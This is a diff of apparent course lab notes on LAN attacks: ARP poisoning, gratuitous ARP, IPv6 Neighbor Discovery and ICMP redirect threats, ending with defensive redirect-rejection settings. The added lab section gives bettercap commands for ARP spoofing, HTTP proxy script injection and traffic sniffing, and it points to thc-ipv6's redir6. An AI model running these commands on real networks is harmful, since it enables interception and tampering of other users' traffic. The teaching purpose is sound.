@@ -10,7 +10,7 @@
 ## What does it require?
 
 - NIC in **[Promiscuous mode](/Labs/%5B1%5DNetworking%20101%2Bscript.md#Network%20Traffic%20Monitoring)** : pass all the observable traffic without discrimination to the CPU
-- Sniffer placed *along the path* or the **same Broadcast domain**
+- Sniffer placed *along the path* or on the **same Broadcast domain**
   - in Non-switched LANs
     - networks with HUBs
   - in Switched LANs
@@ -75,7 +75,7 @@ Today prevention --> **port security**
 > GOAL : *to associate the attacker's MAC address with the IP address of another host (default gateway, DNS, hosts...) causing any traffic meant for that IP address to be sent to the attacker instead*([ARP Poisoning](https://www.tutorialspoint.com/ethical_hacking/ethical_hacking_arp_poisoning.htm))
 > - *Passive/Active attack* type
 >   - *pretend to be anybody*
->   - ARP spoofing is used **as opening for other attacks** 
+>   - [ARP spoofing](https://www.veracode.com/security/arp-spoofing) is used **as opening for other attacks** 
 >   - DOS / MITM / Session hijacking  
 > - ARP has **no authentication mechanism of source host**
 >   - this is a Vulnerability of the protocol
@@ -83,11 +83,12 @@ Today prevention --> **port security**
 
 [Gratuitous ARP response](https://www.practicalnetworking.net/series/arp/gratuitous-arp/) : *broadcast packet* used by hosts to “announce” their IP address to the local network *without any ARP request*
 
-Attacker can flood network with Gratuitous ARP responses and hosts will link IP of default GW with MAC address of Attacker
+Attacker can flood network with Gratuitous ARP responses and hosts will link IP of default GW with MAC address of Attacker redirecting all traffic to the attacker machine
 
 # IPv6 Neighbor Discovery threats
 
- > As ARP for IPv4 : [NDP_refresh](https://www.computernetworkingnotes.com/networking-tutorials/ipv6-neighbor-discovery-protocol-explained.html)(Neigh Solic/Adv) + Duplicate Address Detection(DAD) + ICMPv6 redirect
+ > [Neighbor discovery](https://www.computernetworkingnotes.com/networking-tutorials/ipv6-neighbor-discovery-protocol-explained.html) is set of processes and messages that replace ARP, ICMP Router discovery and ICMP Redirect mss used in IPv4 : Neigh Solic/Adv + Duplicate Address Detection(DAD) + ICMPv6 redirect
+ > - **Neigh Discovery Prt: [RFC 4861](https://datatracker.ietf.org/doc/html/rfc4861)**
  > - **NDP known threats : [RFC 3756](https://datatracker.ietf.org/doc/html/rfc3756)** 
  > - [THC-IPV6-ATTACK-TOOLKIT](https://github.com/vanhauser-thc/thc-ipv6)
  > - [SI6 Networks IPv6 Toolkit](https://github.com/fgont/ipv6toolkit)
@@ -104,7 +105,7 @@ Attacker can flood network with Gratuitous ARP responses and hosts will link IP 
 #### ICMP redirect Attack
 > When multiple routers are on the same local link: one can send an ICMPv6 redirect and inform hosts to forward messages to the other router closes to the destination; this can be exploit to perform a MITM attack
 
-# Lab3 Activity (TO DO!!)
+# Lab3 Activity
 
 ### EX1
 
@@ -129,13 +130,51 @@ $ ip link set veth1 up
 ### EX2
 
 > GOAL : install **[bettercap](https://www.cyberpunk.rs/install-mitm-attack-framework-bettercap)** and perform a MITM attack through **ARP poisoning** 
-> 
-> Victim machine can be host machine: 192.168.100.200/24
+> - [Man-ITM Attack Guide](https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy) | [arp.spoof module](https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/)
+> - Victim machine can be host machine after connection to kathara virtual network
+```bash
+# unzip bettercap
+./bettercap
+help [module_name] # module info 
+net.probe on # network discovery 
+net.show # show network information
+set gateway.address 192.168.100.1 
+# arp poisoning options
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+set arp.spoof.redirect false
+set arp.spoof.targets [all inside network, host included]
+arp.spoof on
+# http script 
+set http.proxy.script http-proxy-pwned.js
+http.proxy on
 
-### EX4/5
-ICMP redirect LAB 
+# enable sniffer and save it
+set net.sniff.verbose true
+set net.sniff.output /shared/sniff_bettercap.pcap
+net.sniff on
+```
+### EX3/4/5
+> GOAL: compile tool inside 'thc-ipv6-3.6' folder and use its modules
+
+> GOAL: redirect ICMP traffic, impersonate r1, flow packets on LANx and capture using wireshark
+> - [redir6 tool](https://www.mankier.com/8/redir6) from thc-ipv6
 
 
-solution >>> reject redirect + unreachable packets !!!!!
+# Reject redirects!!
+
+- /proc/sys/net/ipv4/conf/all/accept_redirects
+  - TRUE (host) //  FALSE (router)
+  - Functional default: enabled if local forwarding is disabled
+  - disabled if local forwarding is enabled
+- /proc/sys/net/ipv4/conf/all/secure_redirects
+  - TRUE
+- /proc/sys/net/ipv4/conf/all/shared_media
+  - TRUE
+- /proc/sys/net/ipv6/conf/all/accept_redirects 
+  
+> accept_redirects and alike --> FALSE
+
+***reject redirect + unreachable packets !!!!!***
 
 
